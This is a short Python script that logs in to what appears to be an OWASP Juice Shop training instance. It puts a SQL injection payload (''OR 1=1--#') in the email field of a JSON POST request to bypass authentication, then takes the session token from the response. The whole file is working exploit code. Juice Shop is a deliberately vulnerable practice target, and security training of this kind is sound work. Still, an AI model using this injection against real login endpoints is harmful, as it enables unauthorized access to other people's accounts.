#!/usr/bin/python3
import requests
import time
import json


def auth_api(url_env):

    payload = "{\"email\":\"'OR 1=1--#\",\"password\":\"password\"}"
    headers = {
    'content-type': 'application/json',
    'host': 'juice-shop.herokuapp.com',
    }

    response = requests.request("POST", url_env, headers=headers, data = payload)
    Final_token = response.json()['authentication']['token']
    return Final_token